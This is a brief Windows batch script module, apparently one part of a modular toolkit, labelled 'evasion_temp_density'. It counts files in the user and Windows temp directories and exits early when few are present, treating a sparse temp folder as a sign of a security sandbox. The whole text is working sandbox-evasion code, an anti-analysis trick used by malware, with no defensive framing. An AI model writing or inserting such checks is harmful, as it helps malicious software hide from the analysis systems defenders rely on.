REM provides: evasion_temp_density
REM depends: (none)
REM description: Check temp directory file density to detect clean sandbox environments

REM Active systems accumulate hundreds of temp files
set "TEMP_COUNT=0"
for /f %%c in ('dir /b "%TEMP%" 2^>nul ^| find /c /v ""') do (
    set "TEMP_COUNT=%%c"
)

REM Sparse temp directory indicates sandbox
if %TEMP_COUNT% LSS 20 exit /b 0

REM Also check Windows temp
set "WTEMP_COUNT=0"
for /f %%c in ('dir /b "%WINDIR%\Temp" 2^>nul ^| find /c /v ""') do (
    set "WTEMP_COUNT=%%c"
)

if %WTEMP_COUNT% LSS 5 exit /b 0
